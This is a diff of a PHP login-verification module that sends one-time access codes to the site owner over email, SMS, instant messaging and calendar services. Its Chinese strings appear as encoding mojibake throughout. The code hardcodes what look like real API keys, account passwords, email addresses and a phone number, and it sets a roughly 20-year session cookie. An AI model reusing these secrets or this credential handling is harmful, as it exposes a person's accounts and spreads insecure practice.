+                  //mail('xcy6272003@126.com','X3193æ­£åœ¨éªŒè¯æ‚¨çš„è®¿é—®æƒé™','æœ¬æ¬¡éªŒè¯åœ°å€ä¸ºï¼š<a href="'.httppathdir().'?api=blank&verify='.strtolower(trim(request('verify'))).'&verifycode='.trim($_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify'][strtoupper(trim(request('verify')))]).'&smsverify=">'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify'][strtoupper(trim(request('verify')))].'</a> ï¼',"Content-type: text/html; charset=gbk"."From: X3193<x3193@0318e.x3193.cu.cc>" . "\r\n" . "Reply-To: X3193<x3193@0318e.x3193.cu.cc>" . "\r\n" .'X-Mailer: PHP/' . phpversion());
                   $html = new mail_class();
-                  $html->html_mail('X3193<x3193@x3193.tk>','15998963077@126.com', 'X3193ÕıÔÚÑéÖ¤ÄúµÄ·ÃÎÊÈ¨ÏŞ', '±¾´ÎÑéÖ¤µØÖ·Îª£º'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['MSG'].'£¬IPµØÖ·Îª£º'.$_SERVER['REMOTE_ADDR'],'gb2312');
+                  $html->html_mail('X3193<x3193@x3193.tk>','15998963077@126.com', 'X3193æ­£åœ¨éªŒè¯æ‚¨çš„è®¿é—®æƒé™', 'æœ¬æ¬¡éªŒè¯åœ°å€ä¸ºï¼š'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['MSG'].'ï¼ŒIPåœ°å€ä¸ºï¼š'.$_SERVER['REMOTE_ADDR'],'gb2312');
      }   
       elseif (strtolower(trim(request('verify'))) == 'sendcloud'){
       $url = 'http://sendcloud.sohu.com/webapi/mail.send.json';
-      //²»Í¬ÓÚµÇÂ¼SendCloudÕ¾µãµÄÕÊºÅ£¬ÄúĞèÒªµÇÂ¼ºóÌ¨´´½¨·¢ĞÅ×ÓÕÊºÅ£¬Ê¹ÓÃ×ÓÕÊºÅºÍÃÜÂë²Å¿ÉÒÔ½øĞĞÓÊ¼şµÄ·¢ËÍ¡£
+      //ä¸åŒäºç™»å½•SendCloudç«™ç‚¹çš„å¸å·ï¼Œæ‚¨éœ€è¦ç™»å½•åå°åˆ›å»ºå‘ä¿¡å­å¸å·ï¼Œä½¿ç”¨å­å¸å·å’Œå¯†ç æ‰å¯ä»¥è¿›è¡Œé‚®ä»¶çš„å‘é€ã€‚
       $param = array('api_user' => 'x3193_tk',
               'api_key' => '4tGTE5IWEArQMoVA',
               'from' => 'x3193@x3193.tk',
               'fromname' => 'x3193.tk',
               'to' => 'xcy6272003@126.com',
-              'subject' => iconv('gb2312','utf-8','X3193ÕıÔÚÑéÖ¤ÄúµÄ·ÃÎÊÈ¨ÏŞ'),
-              'html' => iconv('gb2312','utf-8','±¾´ÎÑéÖ¤ÂëÎª£º'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['MSG']));
+              'subject' => iconv('gb2312','utf-8','X3193æ­£åœ¨éªŒè¯æ‚¨çš„è®¿é—®æƒé™'),
+              'html' => iconv('gb2312','utf-8','æœ¬æ¬¡éªŒè¯ç ä¸ºï¼š'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['MSG']));
       $options = array('http' => array('method'  => 'POST','content' => http_build_query($param)));
       $context  = stream_context_create($options);
       $result = file_get_contents($url, false, $context);
@@ -3263,43 +4891,43 @@ $_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['MSG'] = r
              $conn->connect();
              $conn->processUntil('session_start');
              $conn->presence();
-             $conn->message('x3193@g.x3193.tk', iconv('gb2312','utf-8','±¾´ÎÑéÖ¤ÂëÎª£º'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['MSG']));
+             $conn->message('x3193@g.x3193.tk', iconv('gb2312','utf-8','æœ¬æ¬¡éªŒè¯ç ä¸ºï¼š'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['MSG']));
              $conn->disconnect();
       }   
       elseif (strtolower(trim(request('verify'))) == 'msn'){
 					$sendMsg = new sendMsg();
-					$sendMsg->simpleSend('x3193@live.com', 'EUIfgwe7', 'x3193@x3193.tk',iconv('gb2312','utf-8','±¾´ÎÑéÖ¤ÂëÎª£º'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['MSG']));
+					$sendMsg->simpleSend('x3193@live.com', 'EUIfgwe7', 'x3193@x3193.tk',iconv('gb2312','utf-8','æœ¬æ¬¡éªŒè¯ç ä¸ºï¼š'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['MSG']));
 					//echo $sendMsg->result.' '.$sendMsg->error;
       }   
       elseif (strtolower(trim(request('verify'))) == 'smtp'){
 				$smtp = new smtp('smtp.x3193.tk','25',true,'x3193@x3193.tk','EUIfgwe7');
-        $smtp->sendmail('merujxitcddevjhgg@x3193.tk','x3193.tk', 'x3193@x3193.tk','x3193@x3193.tk', iconv('gb2312','gb2312','X3193ÕıÔÚÑéÖ¤ÄúµÄ·ÃÎÊÈ¨ÏŞ'), iconv('gb2312','gb2312','±¾´ÎÑéÖ¤ÂëÎª£º'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['MSG']), 'txt', '', '', '','600');
+        $smtp->sendmail('merujxitcddevjhgg@x3193.tk','x3193.tk', 'x3193@x3193.tk','x3193@x3193.tk', iconv('gb2312','gb2312','X3193æ­£åœ¨éªŒè¯æ‚¨çš„è®¿é—®æƒé™'), iconv('gb2312','gb2312','æœ¬æ¬¡éªŒè¯ç ä¸ºï¼š'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['MSG']), 'txt', '', '', '','600');
       }      
       elseif (strtolower(trim(request('verify'))) == 'gcal'){
               	$google_calendar = new google_class();
               	$AuthClientLogin = $google_calendar->googleauthclientlogin(trim(base64_encode('xcy6272003@gmail.com')),trim(base64_encode('EUIfgwe7a')),trim('calendar'));
-        				$google_calendar->googlecalendarsendsms($AuthClientLogin,trim('X3193ÕıÔÚÑéÖ¤ÄúµÄ·ÃÎÊÈ¨ÏŞ,±¾´ÎÑéÖ¤ÂëÎª£º'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['MSG'].'IPµØÖ·Îª£º'.$_SERVER['REMOTE_ADDR']),trim('X3193µÇÂ¼ÑéÖ¤'),trim('X3193µÇÂ¼ÑéÖ¤Ä£¿é'));
+        				$google_calendar->googlecalendarsendsms($AuthClientLogin,trim('X3193æ­£åœ¨éªŒè¯æ‚¨çš„è®¿é—®æƒé™,æœ¬æ¬¡éªŒè¯ç ä¸ºï¼š'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['MSG'].'IPåœ°å€ä¸ºï¼š'.$_SERVER['REMOTE_ADDR']),trim('X3193ç™»å½•éªŒè¯'),trim('X3193ç™»å½•éªŒè¯æ¨¡å—'));
       }
       elseif (strtolower(trim(request('verify'))) == 'voxeo'){
    					 $voxeo = new voxeo_class();
-             $voxeo->voxeosendsms('x3193','EUIfgwe7','8615998963077','±¾´ÎÑéÖ¤ÂëÎª£º'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['MSG']);
+             $voxeo->voxeosendsms('x3193','EUIfgwe7','8615998963077','æœ¬æ¬¡éªŒè¯ç ä¸ºï¼š'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['MSG']);
       }
       elseif (strtolower(trim(request('verify'))) == 'fetion'){
-							$fetion = new fetion_class();	// ÊÖ»úºÅ¡¢·ÉĞÅÃÜÂë
-							$fetion->sendmsg('',iconv('gb2312','utf-8','±¾´ÎÑéÖ¤ÂëÎª£º'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['MSG']));	// ½ÓÊÕÈËÊÖ»úºÅ¡¢·ÉĞÅÄÚÈİ   
-							exit;   	
+							$fetion = new fetion_class();	// æ‰‹æœºå·ã€é£ä¿¡å¯†ç 
+							$fetion->sendmsg('','æœ¬æ¬¡éªŒè¯ç ä¸ºï¼š'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['MSG']);	// æ¥æ”¶äººæ‰‹æœºå·ã€é£ä¿¡å†…å®¹   
+							//exit;   	
       	
    					 //$voxeo = new voxeo_class();
-             //$voxeo->voxeosendsms('x3193','EUIfgwe7','8615998963077','±¾´ÎÑéÖ¤ÂëÎª£º'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['MSG']);
+             //$voxeo->voxeosendsms('x3193','EUIfgwe7','8615998963077','æœ¬æ¬¡éªŒè¯ç ä¸ºï¼š'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['MSG']);
       }      
-      redirect(httppath().'?api=blank&verify='.strtolower(trim(request('verify'))).'&verifycode='.trim($_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify'][strtoupper(trim(request('verify')))]).'&msgverify=');
+      redirect(httppath().'?api=verify&verify='.strtolower(trim(request('verify'))).'&verifycode='.trim($_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify'][strtoupper(trim(request('verify')))]).'&msgverify=');
 		}
 }
 elseif(trim(request('verify')) != '' && trim(request('verifycode')) != '' && strlen(trim(request('verifycode'))) == '32' && strtoupper(trim(request('msgverify'))) == ''){
         
 session_set_cookie_params(3600 * 24 * 30 * 12 * 20);
-//ini_set('session.gc_maxlifetime',60);  //ÉèÖÃÀ¬»ø»ØÊÕ×î´óÉú´æÊ±¼ä
-//ini_set('session.gc_probability',10);    //ºÍsession.gc_divisorÒ»Æğ¹¹³ÉÇå³ıÀ¬»øµÄÖ´ĞĞ¼¸ÂÊ
+//ini_set('session.gc_maxlifetime',60);  //è®¾ç½®åƒåœ¾å›æ”¶æœ€å¤§ç”Ÿå­˜æ—¶é—´
+//ini_set('session.gc_probability',10);    //å’Œsession.gc_divisorä¸€èµ·æ„æˆæ¸…é™¤åƒåœ¾çš„æ‰§è¡Œå‡ ç‡
 //ini_set('session.gc_divisor',1);
 session_start();
 if(substr(PHP_VERSION, 0, 3)=='5.4'){
@@ -3324,7 +4952,7 @@ elseif(substr(PHP_VERSION, 0, 3)=='5.3'){
         <tr>
                 <td align="center" valign='middle'>
                         <form action="<?php  echo httppath().'?api=blank&verify='.strtolower(trim(request('verify'))).'&verifycode='.trim($_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify'][strtoupper(trim(request('verify')))]).'&msgverify=';?>" method="post" name="dnspod">
-                        &nbsp¶ÌĞÅÑéÖ¤Âë£º<input type="text" class="text" name="msgverify" value="" style="height:20px;width:20%;font-size:11px" <?php  $style->input("#FCFC9D",""); ?>>  
+                        &nbspçŸ­ä¿¡éªŒè¯ç ï¼š<input type="text" class="text" name="msgverify" value="" style="height:20px;width:20%;font-size:11px" <?php  $style->input("#FCFC9D",""); ?>>  
                         <input type="hidden" class="text" name="skin" value="<?php echo $skincolor;?>"> 
                         &nbsp<input type="submit" class="button" name="docinSubmit" value=" Go ">
                 </td>
@@ -3337,8 +4965,8 @@ elseif(substr(PHP_VERSION, 0, 3)=='5.3'){
 elseif(strtoupper(trim(request('verify'))) != '' && strtoupper(trim(request('verifycode'))) != '' && strlen(trim(request('verifycode'))) == '32' && strtoupper(trim(request('msgverify'))) != '' && strlen(trim(request('msgverify'))) == '8'){
 
 session_set_cookie_params(3600 * 24 * 30 * 12 * 20);
-//ini_set('session.gc_maxlifetime',60);  //ÉèÖÃÀ¬»ø»ØÊÕ×î´óÉú´æÊ±¼ä
-//ini_set('session.gc_probability',10);    //ºÍsession.gc_divisorÒ»Æğ¹¹³ÉÇå³ıÀ¬»øµÄÖ´ĞĞ¼¸ÂÊ
+//ini_set('session.gc_maxlifetime',60);  //è®¾ç½®åƒåœ¾å›æ”¶æœ€å¤§ç”Ÿå­˜æ—¶é—´
+//ini_set('session.gc_probability',10);    //å’Œsession.gc_divisorä¸€èµ·æ„æˆæ¸…é™¤åƒåœ¾çš„æ‰§è¡Œå‡ ç‡
 //ini_set('session.gc_divisor',1);
 session_start();
 if(substr(PHP_VERSION, 0, 3)=='5.4'){
@@ -3353,27 +4981,27 @@ elseif(substr(PHP_VERSION, 0, 3)=='5.3'){
                         }
                         else{
      	 if (strtolower(trim(request('verify'))) == 'sim'){
-                              //mail('xcy6272003@126.com','X3193ÒÑ¾­³É¹¦ÑéÖ¤ÁËÄúµÄ·ÃÎÊÈ¨ÏŞ','±¾´ÎµÇÂ½ÑéÖ¤³É¹¦£¡ÑéÖ¤ÂëÎª£º'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify'][strtoupper(trim(request('verify')))],"From: X3193<x3193@0318e.x3193.cu.cc>" . "\r\n" . "Reply-To: X3193<x3193@0318e.x3193.cu.cc>" . "\r\n" .'X-Mailer: PHP/' . phpversion());
+                              //mail('xcy6272003@126.com','X3193å·²ç»æˆåŠŸéªŒè¯äº†æ‚¨çš„è®¿é—®æƒé™','æœ¬æ¬¡ç™»é™†éªŒè¯æˆåŠŸï¼éªŒè¯ç ä¸ºï¼š'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify'][strtoupper(trim(request('verify')))],"From: X3193<x3193@0318e.x3193.cu.cc>" . "\r\n" . "Reply-To: X3193<x3193@0318e.x3193.cu.cc>" . "\r\n" .'X-Mailer: PHP/' . phpversion());
                   //$html = new mail_class();
-                  //$html->html_mail('X3193<x3193@0318e.x3193.cu.cc>','xcy6272003@126.com', 'X3193ÒÑ¾­³É¹¦ÑéÖ¤ÁËÄúµÄ·ÃÎÊÈ¨ÏŞ', '±¾´ÎµÇÂ½ÑéÖ¤³É¹¦£¡ÑéÖ¤ÂëÎª£º'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify'][strtoupper(trim(request('verify')))].', and the IP is :'.$_SERVER['SERVER_NAME'],'gb2312');
+                  //$html->html_mail('X3193<x3193@0318e.x3193.cu.cc>','xcy6272003@126.com', 'X3193å·²ç»æˆåŠŸéªŒè¯äº†æ‚¨çš„è®¿é—®æƒé™', 'æœ¬æ¬¡ç™»é™†éªŒè¯æˆåŠŸï¼éªŒè¯ç ä¸ºï¼š'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify'][strtoupper(trim(request('verify')))].', and the IP is :'.$_SERVER['SERVER_NAME'],'gb2312');
             		$voxeo = new voxeo_class();
                         $voxeo->voxeosendsms('x3193','EUIfgwe7','8615998963077','Success! The verification code is : '.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['SMS'].', and the IP is :'.$_SERVER['REMOTE_ADDR']);
                               
                       }        
             elseif (strtolower(trim(request('verify'))) == 'email'){
                   $html = new mail_class();
-                  $html->html_mail('X3193<x3193@0318e.x3193.cu.cc>','xcy6272003@126.com', 'X3193ÒÑ¾­³É¹¦ÑéÖ¤ÁËÄúµÄ·ÃÎÊÈ¨ÏŞ', '±¾´ÎµÇÂ½ÑéÖ¤³É¹¦£¡ÑéÖ¤ÂëÎª£º'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify'][strtoupper(trim(request('verify')))].', and the IP is :'.$_SERVER['SERVER_NAME'],'gb2312');
+                  $html->html_mail('X3193<x3193@0318e.x3193.cu.cc>','xcy6272003@126.com', 'X3193å·²ç»æˆåŠŸéªŒè¯äº†æ‚¨çš„è®¿é—®æƒé™', 'æœ¬æ¬¡ç™»é™†éªŒè¯æˆåŠŸï¼éªŒè¯ç ä¸ºï¼š'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify'][strtoupper(trim(request('verify')))].', and the IP is :'.$_SERVER['SERVER_NAME'],'gb2312');
                       } 
       			elseif (strtolower(trim(request('verify'))) == 'sendcloud'){
       $url = 'http://sendcloud.sohu.com/webapi/mail.send.json';
-      //²»Í¬ÓÚµÇÂ¼SendCloudÕ¾µãµÄÕÊºÅ£¬ÄúĞèÒªµÇÂ¼ºóÌ¨´´½¨·¢ĞÅ×ÓÕÊºÅ£¬Ê¹ÓÃ×ÓÕÊºÅºÍÃÜÂë²Å¿ÉÒÔ½øĞĞÓÊ¼şµÄ·¢ËÍ¡£
+      //ä¸åŒäºç™»å½•SendCloudç«™ç‚¹çš„å¸å·ï¼Œæ‚¨éœ€è¦ç™»å½•åå°åˆ›å»ºå‘ä¿¡å­å¸å·ï¼Œä½¿ç”¨å­å¸å·å’Œå¯†ç æ‰å¯ä»¥è¿›è¡Œé‚®ä»¶çš„å‘é€ã€‚
       $param = array('api_user' => 'x3193_tk',
               'api_key' => '4tGTE5IWEArQMoVA',
               'from' => 'x3193@x3193.tk',
               'fromname' => 'x3193.tk',
               'to' => 'xcy6272003@126.com',
-              'subject' => iconv('gb2312','utf-8','X3193.TKÒÑ¾­³É¹¦ÑéÖ¤ÁËÄúµÄ·ÃÎÊÈ¨ÏŞ'),
-              'html' => iconv('gb2312','utf-8','±¾´ÎµÇÂ½ÑéÖ¤³É¹¦£¡ÑéÖ¤ÂëÎª£º'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['MSG']));
+              'subject' => iconv('gb2312','utf-8','X3193.TKå·²ç»æˆåŠŸéªŒè¯äº†æ‚¨çš„è®¿é—®æƒé™'),
+              'html' => iconv('gb2312','utf-8','æœ¬æ¬¡ç™»é™†éªŒè¯æˆåŠŸï¼éªŒè¯ç ä¸ºï¼š'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['MSG']));
       $options = array('http' => array('method'  => 'POST','content' => http_build_query($param)));
       $context  = stream_context_create($options);
       $result = file_get_contents($url, false, $context);
@@ -3381,51 +5009,51 @@ elseif(substr(PHP_VERSION, 0, 3)=='5.3'){
   	  			}                              
             elseif (strtolower(trim(request('verify'))) == 'msn'){
 								$sendMsg = new sendMsg();
-								$sendMsg->simpleSend('x3193@live.com', 'EUIfgwe7', 'x3193@x3193.tk',iconv('gb2312','utf-8','±¾´ÎµÇÂ½ÑéÖ¤³É¹¦£¡±¾´ÎÑéÖ¤ÂëÎª£º'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify'][strtoupper(trim(request('verify')))]));
+								$sendMsg->simpleSend('x3193@live.com', 'EUIfgwe7', 'x3193@x3193.tk',iconv('gb2312','utf-8','æœ¬æ¬¡ç™»é™†éªŒè¯æˆåŠŸï¼æœ¬æ¬¡éªŒè¯ç ä¸ºï¼š'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify'][strtoupper(trim(request('verify')))]));
 								//echo $sendMsg->result.' '.$sendMsg->error;
              	
             }   
       			elseif (strtolower(trim(request('verify'))) == 'smtp'){
 							$smtp = new smtp('smtp.x3193.tk','25',true,'x3193@x3193.tk','EUIfgwe7');
-        			$smtp->sendmail('merujxitcddevjhgg@x3193.tk','x3193.tk', 'x3193@x3193.tk','x3193@x3193.tk', iconv('gb2312','gb2312','±¾´ÎµÇÂ½ÑéÖ¤³É¹¦£¡'), iconv('gb2312','gb2312','±¾´ÎµÇÂ½ÑéÖ¤³É¹¦£¡±¾´ÎÑéÖ¤ÂëÎª£º'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['MSG']), 'txt', '', '', '','600');
+        			$smtp->sendmail('merujxitcddevjhgg@x3193.tk','x3193.tk', 'x3193@x3193.tk','x3193@x3193.tk', iconv('gb2312','gb2312','æœ¬æ¬¡ç™»é™†éªŒè¯æˆåŠŸï¼'), iconv('gb2312','gb2312','æœ¬æ¬¡ç™»é™†éªŒè¯æˆåŠŸï¼æœ¬æ¬¡éªŒè¯ç ä¸ºï¼š'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['MSG']), 'txt', '', '', '','600');
      				}            
             elseif (strtolower(trim(request('verify'))) == 'jabber' || strtolower(trim(request('verify'))) == 'gtalk'){
                $imified = new imified_class();
-                         $sendmsn = $imified->imifiedsendmsg('xcy6272003@126.com','EUIfgwe7','x3193@g.x3193.cz.cc','gtalk','±¾´ÎµÇÂ½ÑéÖ¤³É¹¦£¡±¾´ÎÑéÖ¤ÂëÎª£º'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify'][strtoupper(trim(request('verify')))]);
+                         $sendmsn = $imified->imifiedsendmsg('xcy6272003@126.com','EUIfgwe7','x3193@g.x3193.cz.cc','gtalk','æœ¬æ¬¡ç™»é™†éªŒè¯æˆåŠŸï¼æœ¬æ¬¡éªŒè¯ç ä¸ºï¼š'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify'][strtoupper(trim(request('verify')))]);
             }   
             elseif (strtolower(trim(request('verify'))) == 'yahoo'){
                $imified = new imified_class();
-                         $sendmsn = $imified->imifiedsendmsg('xcy6272003@126.com','EUIfgwe7','xcy6272003@yahoo.com','yahoo','±¾´ÎµÇÂ½ÑéÖ¤³É¹¦£¡±¾´ÎÑéÖ¤ÂëÎª£º'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify'][strtoupper(trim(request('verify')))]);
+                         $sendmsn = $imified->imifiedsendmsg('xcy6272003@126.com','EUIfgwe7','xcy6272003@yahoo.com','yahoo','æœ¬æ¬¡ç™»é™†éªŒè¯æˆåŠŸï¼æœ¬æ¬¡éªŒè¯ç ä¸ºï¼š'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify'][strtoupper(trim(request('verify')))]);
             }   
             elseif (strtolower(trim(request('verify'))) == 'xmpp'){
                $conn = new XMPPHP_XMPP('talk.google.com', 5222, 'xcy6272003@gmail.com', 'EUIfgwe7a', 'xmpphp', 'gmail.com', $printlog=false, $loglevel=XMPPHP_Log::LEVEL_INFO);
                    $conn->connect();
                    $conn->processUntil('session_start');
                    $conn->presence();
-                   $conn->message('x3193@g.x3193.cz.cc', iconv('gb2312','utf-8','±¾´ÎµÇÂ½ÑéÖ¤³É¹¦£¡ÑéÖ¤ÂëÎª£º'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify'][strtoupper(trim(request('verify')))]));
+                   $conn->message('x3193@g.x3193.cz.cc', iconv('gb2312','utf-8','æœ¬æ¬¡ç™»é™†éªŒè¯æˆåŠŸï¼éªŒè¯ç ä¸ºï¼š'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify'][strtoupper(trim(request('verify')))]));
                    $conn->disconnect();
                  
             } 
       			elseif (strtolower(trim(request('verify'))) == 'msn'){
 								$sendMsg = new sendMsg();
-								$sendMsg->simpleSend('x3193@live.com', 'EUIfgwe7', 'x3193@x3193.tk',iconv('gb2312','utf-8','±¾´ÎµÇÂ½ÑéÖ¤³É¹¦£¡ÑéÖ¤ÂëÎª£º'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify'][strtoupper(trim(request('verify')))]));
+								$sendMsg->simpleSend('x3193@live.com', 'EUIfgwe7', 'x3193@x3193.tk',iconv('gb2312','utf-8','æœ¬æ¬¡ç™»é™†éªŒè¯æˆåŠŸï¼éªŒè¯ç ä¸ºï¼š'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify'][strtoupper(trim(request('verify')))]));
 								//echo $sendMsg->result.' '.$sendMsg->error;
       			}               
             elseif (strtolower(trim(request('verify'))) == 'gcal'){
                     	$google_calendar = new google_class();
                     	$AuthClientLogin = $google_calendar->googleauthclientlogin(trim(base64_encode('xcy6272003@gmail.com')),trim(base64_encode('EUIfgwe7a')),trim('calendar'));
-               		$google_calendar->googlecalendarsendsms($AuthClientLogin,trim('±¾´ÎµÇÂ½ÑéÖ¤³É¹¦£¡,±¾´ÎÑéÖ¤ÂëÎª£º'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['SMS'].'IPµØÖ·Îª£º'.$_SERVER['REMOTE_ADDR']),trim('X3193µÇÂ¼ÑéÖ¤'),trim('X3193µÇÂ¼ÑéÖ¤Ä£¿é'));
+               		$google_calendar->googlecalendarsendsms($AuthClientLogin,trim('æœ¬æ¬¡ç™»é™†éªŒè¯æˆåŠŸï¼,æœ¬æ¬¡éªŒè¯ç ä¸ºï¼š'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['SMS'].'IPåœ°å€ä¸ºï¼š'.$_SERVER['REMOTE_ADDR']),trim('X3193ç™»å½•éªŒè¯'),trim('X3193ç™»å½•éªŒè¯æ¨¡å—'));
             }
             elseif (strtolower(trim(request('verify'))) == 'voxeo'){
                $voxeo = new voxeo_class();
-                         $voxeo->voxeosendsms('x3193','EUIfgwe7','8615998963077','±¾´ÎµÇÂ½ÑéÖ¤³É¹¦£¡±¾´ÎÑéÖ¤ÂëÎª£º'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify'][strtoupper(trim(request('verify')))]);
+                         $voxeo->voxeosendsms('x3193','EUIfgwe7','8615998963077','æœ¬æ¬¡ç™»é™†éªŒè¯æˆåŠŸï¼æœ¬æ¬¡éªŒè¯ç ä¸ºï¼š'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify'][strtoupper(trim(request('verify')))]);
             }
        			elseif (strtolower(trim(request('verify'))) == 'fetion'){
-							$fetion = new fetion_class();	// ÊÖ»úºÅ¡¢·ÉĞÅÃÜÂë
-							$fetion->sendmsg('',iconv('gb2312','utf-8','±¾´ÎµÇÂ½ÑéÖ¤³É¹¦£¡±¾´ÎÑéÖ¤ÂëÎª£º'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify'][strtoupper(trim(request('verify')))]));	// ½ÓÊÕÈËÊÖ»úºÅ¡¢·ÉĞÅÄÚÈİ      	
+							$fetion = new fetion_class();	// æ‰‹æœºå·ã€é£ä¿¡å¯†ç 
+							$fetion->sendmsg('',iconv('gb2312','utf-8','æœ¬æ¬¡ç™»é™†éªŒè¯æˆåŠŸï¼æœ¬æ¬¡éªŒè¯ç ä¸ºï¼š'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify'][strtoupper(trim(request('verify')))]));	// æ¥æ”¶äººæ‰‹æœºå·ã€é£ä¿¡å†…å®¹      	
     	
    					 //$voxeo = new voxeo_class();
-             //$voxeo->voxeosendsms('x3193','EUIfgwe7','8615998963077','±¾´ÎÑéÖ¤ÂëÎª£º'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['MSG']);
+             //$voxeo->voxeosendsms('x3193','EUIfgwe7','8615998963077','æœ¬æ¬¡éªŒè¯ç ä¸ºï¼š'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['MSG']);
       			}            
          }
                    			unset($_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify'][strtoupper(trim(request('verify')))]);
@@ -3450,29 +5078,29 @@ elseif(substr(PHP_VERSION, 0, 3)=='5.3'){
                         }
                         else{
             if (strtolower(trim(request('verify'))) == 'sms'){
-                                   //mail('xcy6272003@126.com','X3193ÑéÖ¤ÄúµÄ·ÃÎÊÈ¨ÏŞÊ§°Ü','±¾´ÎµÇÂ½ÑéÖ¤Ê§°Ü£¡ÇëÖØĞÂÑéÖ¤£¡ÑéÖ¤ÂëÎª£º'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['EMAIL'],"From: X3193<x3193@0318e.x3193.cu.cc>" . "\r\n" . "Reply-To: X3193<x3193@0318e.x3193.cu.cc>" . "\r\n" .'X-Mailer: PHP/' . phpversion());
+                                   //mail('xcy6272003@126.com','X3193éªŒè¯æ‚¨çš„è®¿é—®æƒé™å¤±è´¥','æœ¬æ¬¡ç™»é™†éªŒè¯å¤±è´¥ï¼è¯·é‡æ–°éªŒè¯ï¼éªŒè¯ç ä¸ºï¼š'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['EMAIL'],"From: X3193<x3193@0318e.x3193.cu.cc>" . "\r\n" . "Reply-To: X3193<x3193@0318e.x3193.cu.cc>" . "\r\n" .'X-Mailer: PHP/' . phpversion());
                   //$html = new mail_class();
-                  //$html->html_mail('X3193<x3193@0318e.x3193.cu.cc>','xcy6272003@126.com', 'X3193ÑéÖ¤ÄúµÄ·ÃÎÊÈ¨ÏŞÊ§°Ü', '±¾´ÎµÇÂ½ÑéÖ¤Ê§°Ü£¡ÇëÖØĞÂÑéÖ¤£¡ÑéÖ¤ÂëÎª£º'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['EMAIL'].', and the IP is :'.$_SERVER['SERVER_NAME'],'gb2312');
+                  //$html->html_mail('X3193<x3193@0318e.x3193.cu.cc>','xcy6272003@126.com', 'X3193éªŒè¯æ‚¨çš„è®¿é—®æƒé™å¤±è´¥', 'æœ¬æ¬¡ç™»é™†éªŒè¯å¤±è´¥ï¼è¯·é‡æ–°éªŒè¯ï¼éªŒè¯ç ä¸ºï¼š'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['EMAIL'].', and the IP is :'.$_SERVER['SERVER_NAME'],'gb2312');
             		$voxeo = new voxeo_class();
